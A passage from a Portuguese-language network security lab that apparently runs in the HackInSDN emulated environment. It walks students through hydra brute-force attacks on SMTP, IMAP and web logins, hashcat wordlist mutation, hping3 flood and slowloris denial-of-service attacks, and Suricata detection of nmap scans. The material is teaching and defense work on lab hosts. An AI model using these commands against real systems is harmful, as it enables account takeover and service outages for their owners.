|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://cvedetails.com/cve/2014-0160/
465/tcp  closed smtps
587/tcp  closed submission
993/tcp  closed imaps
995/tcp  closed pop3s
8443/tcp closed https-alt
...
```

Observe que o host 172.16.40.1 é listado como vulnerável ao ataque. De fato, esse host foi incluído propositalmente na topologia e sua execução é baseada no repositório de vulnerabilidades do projeto HackInSDN.

## Atividade 3 - Ataques de brute-force

Ataques de brute-force são ataques contra o mecanismo de autenticação em que o atacante executa diversas tentativas de autenticação para obter credenciais válidas na "força bruta", ou seja, na tentativa e erro. Os testes de autenticação podem ser baseados em um conjunto de usuários e senhas candidatos (também conhecido como *wordlist* ou ataque de dicionário) ou podem ser baseados em valores (pseudo-)aleatórios (exemplo: senha120, senha121, senha122, senha123, ...) -- dizemos pseudo-aleatórios pois o processo de geração de valores pode ser melhorado com heurísticas que aumentam as chances de sucesso. Os ataques de brute-force podem ainda ter como alvo sistemas online ou ainda hashes de senhas que vazaram e, eventualmente, pode ser quebradas (para obter a entrada que gerou o hash). Nesta atividade vamos mostrar ataques de brute-force contra sistemas online.

### 3.1 Download de dicionários e regras de geração de senhas

O primeiro passo é fazer o download de um dicionário de usuários (logins) e senhas para aumentar a efetividade do ataque. Nesta atividade disponibilizamos dicionários curtos para realização da prática.

O primeiro passo é fazer o download dos dicionários. Para isso, acesso o terminal do Mininet-Sec a partir do Dashboard HackInSDN:

![abrir Mininet-Sec terminal](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/abrir-mnsec-terminal.png)

Em seguida, no terminal do Mininet-Sec, execute os seguintes comandos:
```
cd /tmp
```
```
curl -LO https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/wordlist-password.txt
```
```
curl -LO https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/wordlist-login.txt
```

Ainda no terminal do Mininet-Sec, faça também o download de um arquivo de regras para geração de senhas que são muito úteis para expandir o dicionário com combinações tipicamente adotadas pelos usuários:
```
cd /tmp
```
```
curl -LO https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/refs/heads/master/OneRuleToRuleThemAll.rule
```

### 3.2 Ataques de força-bruta contra o SMTP e IMAP

Nesta atividade, realizaremos ataques de força bruta contra os mecanismos de autenticação dos serviços SMTP e IMAP. 

Para visualizar o ataque de força bruta ocorrendo, abra o terminal do host srv102 e execute o seguinte comando para monitorar o log das aplicações:
```
tail -f /tmp/mnsec/srv102/log/smtp.log
```

O comando acima irá exibir mensagens de log relacionadas a falhas de login.

De volta ao terminal do Mininet-Sec, vamos utilizar o aplicativo **mnsecx** (mininet-sec exec) para executar comandos em nós específicos da topologia. Por exemplo, para executar o ataque de brute-force a partir do host h401, execute o seguinte comando no Terminal do Mininet-Sec:
```
mnsecx h401 hydra -I -L /tmp/wordlist-login.txt -P /tmp/wordlist-password.txt smtp://172.16.10.2/PLAIN
```

O comando acima inicializará um ataque de força bruta contra o serviço SMTP que está em execução no srv102 (172.16.10.2). Após executar o ataque você deve visualizar uma saída como mostrado abaixo:
```
root@mininet-sec-637b0d4f77fb4f-dc67c9b77-f2x6p:/src/mnsec# mnsecx h401 hydra -I -L /tmp/wordlist-login.txt -P /tmp/wordlist-password.txt smtp://172.16.10.2/PLAIN
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-29 07:52:15
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 315 login tries (l:15/p:21), ~20 tries per task
[DATA] attacking smtp://172.16.10.2:25/PLAIN
[25][smtp] host: 172.16.10.2   login: teste   password: hackinsdn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-29 07:52:20
```

No terminal do srv102, pare a execução do tail com o comando CTRL+C e visualize as tentativas de conexão:
```
root@srv102:~# tail -f /tmp/mnsec/srv102/log/smtp.log
...
{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "hackinsdn", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50540", "status": "success", "timestamp": "2024-09-29T07:52:17.149453", "username": "teste"}
{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "password", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50598", "status": "failed", "timestamp": "2024-09-29T07:52:17.159672", "username": "guest"}
{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "123456", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50568", "status": "failed", "timestamp": "2024-09-29T07:52:17.170760", "username": "guest"}
{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "teste123", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50588", "status": "failed", "timestamp": "2024-09-29T07:52:17.171292", "username": "guest"}
{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "abc123", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50592", "status": "failed", "timestamp": "2024-09-29T07:52:17.171531", "username": "guest"}
...
^C
```

Observe que o hydra reporta ter encontrado uma combinação válida de credenciais: usuário "teste" e senha "hackinsdn". Isso ocorre pois propositalmente configuramos o serviço SMTP em execução no srv102 para aceitar estas credenciais, e os dicionários utilizados continham combinações que casaram com essa configuração.

Vamos realizar agora um novo ataque de força-bruta, porém dessa vez contra o serviço IMAP. Nesse teste utilizamos o software Dovecot, que provê suporte aos serviços de IMAP e POP3 com TLS e diferentes mecanismos de autenticação. Por padrão, a autenticação do Dovecot é baseada nos usuários locais do Linux, portanto o primeiro passo é criar uma conta local que será alvo do ataque.

No terminal do srv102, crie uma conta local para o usuário "admin" (essa conta será criada sem um shell válido):
```
useradd -m -s /bin/false admin
```

Depois configure a senha "Hackinsdn123!" para o usuário:
```
echo "admin:Hackinsdn123!" | chpasswd
```

Observe que a senha utilizada agora possui algumas características de segurança, como uso de letras maiúsculas e minúsculas, números e caracteres especiais.

O próximo passo é iniciar o serviço Dovecot. Ainda no terminal do srv102, execute os seguintes comandos para iniciar o Dovecot:
```
service-mnsec-dovecot.sh srv102 --start
```

Para verificar seu funcionamento execute o comando abaixo:
```
netstat -lnptu
```

Após executar o comando acima, o Dovecot será iniciado e estará apto a tratar requisições do protocolo IMAP e POP3 sem SSL (portas 143 e 110) e com SSL (993 e 995). A saída esperada para o comando acima é mostrado abaixo:
```
root@srv102:~# service-mnsec-dovecot.sh srv102 --start
root@srv102:~# netstat -lnptu
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      45042/dovecot       
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      45042/dovecot       
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      45042/dovecot       
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      45042/dovecot       
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1360/python3        
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      43761/python3       
tcp6       0      0 :::993                  :::*                    LISTEN      45042/dovecot       
tcp6       0      0 :::995                  :::*                    LISTEN      45042/dovecot       
tcp6       0      0 :::110                  :::*                    LISTEN      45042/dovecot       
tcp6       0      0 :::143                  :::*                    LISTEN      45042/dovecot       
```

Agora vamos abrir o terminal do host h401 e executar novamente o hydra para realizar o ataque de brute-force no serviço IMAP, desta vez vamos fixar o login simulando um ataque direcionado:
```
hydra -I -l admin -P /tmp/wordlist-password.txt imap://172.16.10.2/PLAIN
```

Ao executar o comando acima você deverá observar uma série de erros retornados pelo hydra. A saída esperada é ilustrada abaixo:
```
root@h401:~# hydra -I -l admin -P /tmp/wordlist-password.txt imap://172.16.10.2/PLAIN
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-29 08:35:22
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:1/p:21), ~2 tries per task
[DATA] attacking imap://172.16.10.2:143/PLAIN
[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
...
[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.

1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-29 08:35:24
```

A mensagem de erro listada acima (`IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled`) indica que os mecanismos de autenticação estão desativados quando a conexão não possui criptografia TLS/SSL (boa prática!). Portanto, temos duas opções na execução do hydra: 1) executar um STARTTLS para transformar a conexão IMAP em uma conexão segura, ou executar o Hydra na porta do IMAPS (993). Vamos executar o Hydra com STARTTLS:
```
hydra -I -l admin -P /tmp/wordlist-password.txt imap://172.16.10.2/TLS:PLAIN
```

Observe que nenhum erro adicional foi reportado, porém o hydra não identificou credenciais válidas:
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:1/p:21), ~2 tries per task
[DATA] attacking imap://172.16.10.2:143/TLS:PLAIN
1 of 1 target completed, 0 valid password found
```

Isso ocorre pois o dicionário de senhas utilizado não contém a senha do usuário (bom sinal!). Na próxima atividade vamos experimentar algumas técnicas adicionais que podem ser aplicadas nesse cenário.

> [!TIP]  
> Execute o tcpdump no host srv102 (`tcpdump -i srv102-eth0 -n -vv`) para visualizar os pacotes recebidos e confirmar o uso de TLS/SSL na conexão.

### 3.3 - Ataque de brute-force com senhas geradas dinamicamente

Nesta atividade vamos experimentar dois métodos que podem ser utilizados em ataques de força bruta para expandir o conjunto de senhas usadas no ataque: a) geração de senhas a partir de conjunto de caracteres; e b) mutação do dicionário de senhas a partir de combinações diversas.

No Mininet-Sec, abra o Terminal do host srv103. No terminal do host srv103, execute o seguinte comando para iniciar o serviço HTTP com apache2:
```
service-mnsec-apache2.sh srv103 --start --login admin --pass adm123
```

O comando acima inicializará o Apache2 para prover o serviço web nos protocolos HTTP e HTTPS com um site que possui URLs protegidas por autenticação HTTP Basic e outras URLs protegidas por autenticação baseada em formulários HTML (muito comum em sites na Internet). Observe que a senha que configuramos acima (`adm123`), apesar de simples, não consta no dicionário que utilizamos anteriormente.

Antes de realizar o ataque de força bruta em si, vamos testar manualmente o acesso à página utilizando a ferramenta curl. No terminal do host h401, execute o seguinte comando:
```
curl http://172.16.10.3/admin/
```

Observe que a saída do comando acima retorna uma página HTML com mensagem de erro de acesso não autorizado (`401 Unauthorized`).

Vamos repetir o teste porém agora fornecendo as credenciais de acesso:
```
curl -u admin:adm123 http://172.16.10.3/admin/
```

A saída esperada demonstra o uso correto das credenciais:
```
root@h401:~# curl -u admin:adm123 http://172.16.10.3/admin/
<h1>Welcome to admin page (http basic)</h1>
```

Executaremos agora o ataque de força bruta. Vamos inicialmente utilizar o hydra para tentar quebrar a senha utilizando o método de geração de senhas a partir de um conjunto de caracteres. No terminal do host h401 execute o seguinte comando:
```
hydra -I -V -l admin -x 6:6:aA1 https-get://172.16.10.3/admin/
```

Ao executar o comando acima, o Hydra retorna um erro (_definition for password bruteforce (-x) generates more than 4 billion passwords, it is just not feasible to try so many attempts_) informando que o conjunto de caracteres escolhido gera muitas combinações, tornando o ataque computacionalmente infactível de realizar. No comando acima combinamos letras minúsculas (`a`), maiúsculas (`A`) e números (`1`). Vamos reduzir o conjunto de caracteres para combinar apenas letras minúsculas e números. Repita o comando acima porém agora com uma modificação:
```
hydra -I -V -l admin -x 6:6:a1 https-get://172.16.10.3/admin/
```

Você pode acompanhar o ataque no host srv103 através dos logs `apache2/access.log` e `apache2/error.log`, conforme ilustrado abaixo:
```
root@srv103:~# tail apache2/access.log 
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
192.168.40.1 - admin [29/Sep/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
root@srv103:~# tail apache2/error.log 
[Sun Sep 29 09:10:27.745656 2024] [auth_basic:error] [pid 46417:tid 46441] [client 192.168.40.1:53960] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
[Sun Sep 29 09:10:27.756304 2024] [auth_basic:error] [pid 46416:tid 46419] [client 192.168.40.1:53962] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
[Sun Sep 29 09:10:27.765881 2024] [auth_basic:error] [pid 46417:tid 46426] [client 192.168.40.1:53976] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
[Sun Sep 29 09:10:27.765995 2024] [auth_basic:error] [pid 46416:tid 46440] [client 192.168.40.1:53980] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
[Sun Sep 29 09:10:27.766036 2024] [auth_basic:error] [pid 46417:tid 46469] [client 192.168.40.1:53978] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
[Sun Sep 29 09:10:27.776285 2024] [auth_basic:error] [pid 46417:tid 46458] [client 192.168.40.1:53984] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
[Sun Sep 29 09:10:27.776409 2024] [auth_basic:error] [pid 46416:tid 46449] [client 192.168.40.1:53996] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
[Sun Sep 29 09:10:27.786688 2024] [auth_basic:error] [pid 46416:tid 46468] [client 192.168.40.1:54008] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
[Sun Sep 29 09:10:27.796642 2024] [auth_basic:error] [pid 46416:tid 46455] [client 192.168.40.1:54010] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
[Sun Sep 29 09:10:27.807040 2024] [auth_basic:error] [pid 46417:tid 46439] [client 192.168.40.1:54018] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
```

Aguarde alguns minutos e verifique se o Hydra conseguiu identificar alguma credencial válida. No terminal do host h401, pare a execução do Hydra com o comando CTRL+C. Observe que diversas tentativas foram enviadas para o servidor porém nenhuma com sucesso, e diversas outras tentativas ainda estão pendentes. Esse tipo de ataque pode gerar muito ruído na rede (exemplo: logs de falha) e facilmente ser bloqueado.

Vamos realizar um novo ataque de força bruta em uma página web, porém agora contra um site cujo login ocorre através de formulários HTML (cenário bastante comum). Como fizemos anteriormente, primeiro vamos fazer o acesso manualmente e em seguida executar o ataque.

A partir do host h401, faça uma requisição ao site protegido por autenticação baseada em formulário HTML:
```
curl -k https://172.16.10.3/auth/
```

Observe na saída HTML que a página requer autenticação através de um formulário HTML, cujas credenciais devem ser fornecidas pelo usuário através dos campos `username` e `password`. Vamos simular um usuário fornecendo as credenciais corretas através do curl.

No terminal do h401, execute:
```
curl -k https://172.16.10.3/auth/ -X POST -d "username=admin&password=adm123"
```

A mensagem de saída indica o sucesso na autenticação (`Welcome admin!`).

Vamos repetir o ataque de força-bruta anterior, porém agora contra o mecanismo de autenticação baseado em formulário HTML. No terminal do h401, execute:
```
hydra -I -V -l admin -P /tmp/wordlist-password.txt "https-form-post://172.16.10.3/auth/:username=^USER^&password=^PASS^:Invalid"
```

Observe que o alvo do ataque no comando acima é composto por 4 partes relacionadas, a saber: 1) o método do ataque (`https-form-post`), ou seja, o protocolo a ser utilizado será https e o método de ataque será formulário html através de uma requisição HTTP POST; 2) a URL de login na qual o formulário html será submetido (`//172.16.10.3/auth/`); 3) o nome dos campos de entrada do formulário relacionados ao login e senha (`:username=^USER^&password=^PASS^` onde `^USER^` e `^PASS^` serão substituídos pelos valores informados no Hydra nos parâmetros `-l/-L` e `-p/-P` respectivamente); 4) finalmente uma string que identifica uma situação de falha de login (`Invalid`) -- permitindo ao Hydra identificar quando a tentativa teve sucesso ou falha.

Em todos os casos acima, bem como no ataque de força bruta contra o serviço de IMAP, o Hydra falhou para identificar credenciais válidas, pois ou os dicionários utilizados não continham a senha de interesse, ou o método de geração de senha mostrou-se computacionalmente infactível. Em seguida, vamos estudar um outro mecanismo de ataque de brute-force que pode ajudar nesses casos. Trata-se dos esquemas de mutação de dicionário, que visam expandir a lista de palavras com modificações tipicamente adotadas pelos usuários (exemplo: a partir de uma palavra base, transformar certos caracteres em maiúsculo ou adicionar números ou adicionar caracteres especiais, enfim).

Para essa atividade utilizaremos regras de mutação apresentadas no seguinte artigo: https://www.notsosecure.com/one-rule-to-rule-them-all/. A ferramenta `hashcat` permite utilizar regras dese tipo para expandir um dicionário de senhas, bem como outros mecanismos de mutação (exemplo: combinar as próprias palavras do dicionário entre si -- ou de múltiplos dicionários, combinar as palavras do dicionário com máscaras de substring aleatórias, entre outras). 

Utilizando as regras do blog citado anteriormente (cujo download já realizamos no passo 3.1), execute o seguinte comando no host h401:
```
hashcat -r /tmp/OneRuleToRuleThemAll.rule --stdout /tmp/wordlist-password.txt > /tmp/mutated
```

> [!TIP]  
> A instalação padrão do hashcat já inclui algumas regras de mutação de dicionários no diretório `/usr/share/hashcat/rules`.

Em seguida, vamos checar se as senhas que buscamos estão no dicionário expandido. Primeiro, busque pela senha "Hackinsdn123!":
```
grep -w -n "Hackinsdn123!" /tmp/mutated
```

Depois busque pela outra senha, "adm123":
```
grep -w -n "adm123" /tmp/mutated
```

Como pode observar, ambas as senhas estão no dicionário expandido. O parâmetro `-n` no grep mostra o número da linha na qual a string foi encontrada, o que ajuda a entender quantas tentativas seriam mais ou menos necessárias para o Hydra obter sucesso. No entanto, você pode utilizar também técnicas de reordenação aleatória do arquivo para aumentar a chances de encontrar as credenciais válidas mais cedo.

> [!IMPORTANT]  
> Como prevenir tais ataques de força bruta na autenticação dos serviços de rede ilustrados anteriormente?
<textarea name="resposta_brute_force" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

## Atividade 4 - Ataques de negação de serviço

Nesta atividade mostraremos dois tipos de ataque de negação de serviço: exaustão de recursos por consumo de banda e ataques do tipo Slow HTTP. Os ataques de negação de serviço por consumo de banda são os mais comuns atualmente, tipicamente ocorrendo de forma distribuída e alcançando volumetria de tráfego cada vez mais impressionantes. Por outro lado, os ataques do tipo Slow HTTP são ataques mais especializados e "silenciosos", que visam gerar requisições bem lentamente para o servidor web, mantendo-o ocupado e impossibilitado de tratar requisições legítimas (afetando servidores web que tratam requisições a partir de um pool de threads, por exemplo).

No cenário deste laboratório, o ataque volumétrico afetará o servidor web srv501, que possui um link de apenas 10Mb - sujeito a exaustão de recursos. Já o ataque de Slow HTTP terá como alvo o servidor srv101 - que executa o Apache e pode ser alvo do ataque.

Antes de iniciar ambos os ataques, vamos habilitar o monitoramento de estatísticas de rede na porta do host secflood1 para compararmos a volumetria de tráfego em ambos os ataques. Para isso, a partir da interface do Dashboard abra o terminal do Mininet-sec e execute o seguinte comando:
```
ifstat -t -b -i s201-eth2
```

A saída esperada é ilustrada abaixo:

![ifstat on mininet-sec](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/ifstat-mnsec.png)


### 4.1 Negação de serviço por consumo de banda

Para monitorar os impactos do ataque, vamos iniciar um cliente legítimo e monitorar pelo tempo de resposta da página (consideraremos um timeout de 1s antes de considerar a página inacessível). Para isso, no terminal do host h101, execute:
```
ali -t 1s -d 0 http://172.16.50.1
```

Após abrir a ferramenta "ali", pressione ENTER para iniciar o monitoramento, conforme ilustrado abaixo:

![ali on h101](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/ali-h101.png)

Observe que todas as requisições estão retornando código 200, e o tempo de resposta médio gira em torno de 1.6ms com valor máximo de pouco mais de 3 milisegundos.

Em seguida, a partir do terminal do Secflood1 execute o seguinte ataque de negação de serviço:
```
hping3 --udp -p 53 -d 1000 --flood 172.16.50.1
```

Volte ao gráfico do host h101 e observe que imediatamente o tempo de resposta subiu para 1s (valor máximo de timeout configurado) e muitas requisições agora retornam erro de tempo máximo de resposta estourado. O gráfico abaixo ilustra tal comportamento:

![hping secflood](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/flood-http.png)

Pare o ataque pressionando CTRL+C no terminal do Secflood1. Volte ao gráfico do host h101 e observe imediatamente o tempo de resposta é normalizado.

No host h101, pare o "ali" pressionando a tecla "q". 

Observe que o cliente legítimo (neste cenário representado pela ferramenta "ali" no host h101) foi totalmente impactado pelo ataque contra o servidor srv501, ou seja, todos os recursos disponíveis no servidor srv501 foram exauridos pelo ataque, indisponibilizando o serviço.

### 4.2 Negação de serviço do tipo Slow HTTP

Os ataques do tipo Slow HTTP consistem no envio de requisições HTTP bem lentamente para manter o servidor ocupado e inapto a tratar requisições legítimas. O ataque de _Slowloris_ possui exatamente este modus operandi, consistindo basicamente em um cliente que sobrecarrega um servidor alvo com requisições simultâneas de abertura e manutenção da conexão. Nesta atividade, utilizaremos como alvo o servidor srv103 (lembre-se que iniciamos o Apache2 no host srv103 na Atividade 3.3).

Novamente vamos executar o aplicativo "ali" para monitorar os impactos do ataque, simulando um usuário legítimo. Para isso, execute o seguinte comando no host h101:
```
ali -t 1s -d 0 http://172.16.10.3
```

Após abrir a ferramenta "ali", pressione ENTER para iniciar o monitoramento.

Em seguida, a partir do terminal do Secflood1 execute o seguinte ataque de negação de serviço:
```
slowloris -p 80 -s 300 172.16.10.3
```

Volte ao gráfico do host h101 e observe que imediatamente o tempo de resposta subiu para 1s (valor máximo de timeout configurado) e muitas requisições agora retornam erro de tempo máximo de resposta estourado. O gráfico abaixo ilustra tal comportamento:

![slowloris](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/slowloris.png)

Em seguida, navegue novamente para o terminal do secflood1 e pressione CTRL+C para encerrar o ataque. Acesse novamente o gráfico do "ali" no host h101 e observe que alguns segundos depois o acesso é normalizado.

No terminal do host h101, feche o gráfico do "ali", pressionando a tecla "q".

No terminal do Mininet-sec, pare a coleta de estatísticas de rede do ifstat pressionando CTRL+C. Observe as estatísticas coletadas do ataque com hping3 e slowloris, conforme ilustrado na figura abaixo:

![ifstat mnsec attacks](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/ifstat-mnsec-attacks.png)

> [!IMPORTANT]  
> Comparando a volumetria de tráfego entre os dois ataques, explique quais mecanismos poderiam ser utilizados para detectar cada um deles e quais mitigações poderiam ser aplicados para reduzir os danos.
<textarea name="resposta_ataques_dos_hping_slowloris" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

## Atividade 5 - Execução, Detecção e Contenção de ataques de varredura

Nesta última atividade, vamos ilustrar um fluxo completo de execução, detecção e contenção de ataques, precisamente ataque de varredura de portas.

O primeiro passo é ativar a execução do ataque na interface web do Secflood. Neste ataque, vamos utilizar a ferramenta nmap e configurá-la de forma a executar de forma periódica para fazer a varredura de portas a cada 30 segundos.

Na interface web do Secflood, selecione o menu _Tool List_ e depois _NMAP_. Forneça os dados abaixo:
- No campo "Enter the target's address" informe: `--min-rate 300 172.16.50.1`
- Na parte +Options, preencha o campo "Scan specific ports" com: `1-1024`
- Ainda nas opções adicionais, marque a opção de "Scan using UDP";
- Na parte Execution parameters, deve-se definir as seguintes opções;
 - Repeat this command: -1;
 - Delay strategy: Fixed;
 - Delay to start: 30.
- Após isso, selecionamos Add for bulk execute later;

Abaixo uma ilustração da configuração acima:
![secflood nmap repeat](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/secflood-nmap-repeat.png)

Em Bulk Execution, é possível visualizar que o ataque foi configurado. Em seguida, clicamos em Execute tasks.
![secflood bulk exec](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/secflood-bulk-exec-1.png)

Com a execução desses comandos, o ataque será configurado e executado. Na aba Dashboard da interface web do secflood, pode-se observar a grande quantidade de tráfego gerado. 
![secflood bulk exec](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/secflood-bulk-exec.png)

Agora podemos acessar o terminal do srv501 e rodar o comando abaixo para visualizar o ataque de scan sendo recebido no servidor:
```
tcpdump -i srv501-eth0 -n
```

O próximo passo é configurar mecanismos para detectar o ataque. Para isso, vamos configurar um Sistema de Detecção de Intrusão (IDS) baseado no Suricata, com regras customizadas para detecção de ataques de varredura de portas. O funcionamento de qualquer IDS pressupõe ou um modelo de implantação em que o tráfego é transportado através do IDS (modo _inline_) ou o tráfego é espelhado para o IDS para análise. Nesta atividade vamos utilizar o modelo espelhado. Assim, precisaremos espelhar o tráfego de rede gerado pelo Secflood para o IDS que executa no host **ids201**. Note que neste cenário da atividade o IDS detecta os ataques na rede de origem, potencialmente identificando máquinas comprometidas efetuando ataques externos. Em ambiente reais, além da detecção na origem, este tipo de ataque pode ser identificado também no destino ou em provedores intermediários, casos que tipicamente resultam em notificações de incidente de segurança que deverão ser tratadas pelo time de segurança da organização que originou o ataque.

Para espelhar o tráfego para o ids201, vamos utilizar o controlador SDN Kytos com uma aplicação de espelhamento de tráfego. Para isso, a partir da topologia no Mininet-Sec, abra o terminal do Kytos e digite os comandos a seguir para obter o ID do circuito criado:
```
EVC_ID=$(curl -s http://127.0.0.1:8181/api/kytos/mef_eline/v2/evc/ | jq -r '.[].id')
```
```
echo $EVC_ID
```

A saída esperada é o ID do circuito, no formato "08e9526bee7e40".

A partir do ID do circuito, ainda no terminal do Kytos, execute o comando a seguir para habilitar o espelhamento de tráfego no circuito em questão:
```
curl -s -X POST -H 'Content-type: application/json' http://127.0.0.1:8181/api/hackinsdn/mirror/v1/ -d '{"circuit_id": "'$EVC_ID'", "switch": "00:00:00:00:00:00:00:cb", "target_port": "00:00:00:00:00:00:00:cb:5", "name": "mirror for EVC '$EVC_ID'"}' | jq -r
```

Saída esperada: `{"mirror_id":"d01deb36c2d345"}`

Com os comandos acima, habilitamos o espelhamento do tráfego do switch s203 (que possui o ID indicado no comando) para a interface s203-eth5 (Indicada no comando somente pelo número 5), a qual conecta o s203 ao host ids201, o qual possui uma instanciação do Suricata.

No terminal do ids201, execute o seguinte comando para observar os pacotes do secflood direcionados ao srv501 sendo espelhados para o IDS:
```
tcpdump -i ids201-eth0 -n
```

Você deve observar pacotes de LLDP do Kytos e também os pacotes da varredura UDP realizada a partir do secflood (lembre-se que configuramos um intervalo de 30 segundos entra cada varredura no Secflood, então é possível que o tcpdump acima leve alguns segundos para exibir os pacotes da varredura). Após confirmar que o IDS está recebendo o tráfego espelhado, pare a captura de pacotes digitando CTRL+C.

Ainda no terminal do ids201, pode ser executado o seguinte comando para observar os logs do suricata sobre o ataque:
```
tail /var/log/suricata/fast.log
```

A saída esperada para o comando acima pode ser ilustrada abaixo:
```
29/09/2024-14:36:47.216537  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60569 -> 172.16.50.1:238
29/09/2024-14:36:47.249943  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60567 -> 172.16.50.1:590
29/09/2024-14:36:47.283256  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60563 -> 172.16.50.1:518
